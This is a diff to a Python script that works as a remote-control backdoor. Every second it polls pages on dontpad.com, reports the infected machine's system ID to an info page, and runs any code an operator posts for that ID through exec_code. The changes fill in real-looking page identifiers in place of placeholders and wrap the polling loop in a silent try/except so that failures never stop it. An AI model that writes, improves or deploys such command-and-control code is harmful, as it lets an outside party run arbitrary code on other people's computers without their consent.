@@ -9,8 +9,8 @@ import string
 
 
 MAIN_URL = "http://dontpad.com/"
-CODE_PAGE_EXTENSION = "INSERT_LINK"
-INFO_PAGE_EXTENSION = "INSERT_LINK"
+CODE_PAGE_EXTENSION = "xc3LalUOPo"
+INFO_PAGE_EXTENSION = "cTxQSlMqTc"
 # defines URL for online text file access and sub-URL's
 
 
@@ -136,18 +136,21 @@ except:
 
 
 while True:  # checks for updates on online text file exery second
-    code = read(CODE_PAGE_EXTENSION)
+    try:
+        code = read(CODE_PAGE_EXTENSION)
 
-    found_ids = read(INFO_PAGE_EXTENSION).split("\n")
+        found_ids = read(INFO_PAGE_EXTENSION).split("\n")
 
-    if MAIN_URL + system_id not in found_ids:
-        write_info()
+        if MAIN_URL + system_id not in found_ids:
+            write_info()
 
-    for id in found_ids:  # runs code if correct conditions met
-        if id == "%":
-            disable_first_execution()        
-            break
-        elif MAIN_URL + system_id == id:
-            exec_code(code)
+        for id in found_ids:  # runs code if correct conditions met
+            if id == "%":
+                disable_first_execution()        
+                break
+            elif MAIN_URL + system_id == id:
+                exec_code(code)
 
-    time.sleep(1)
+        time.sleep(1)
+    except:
+        pass
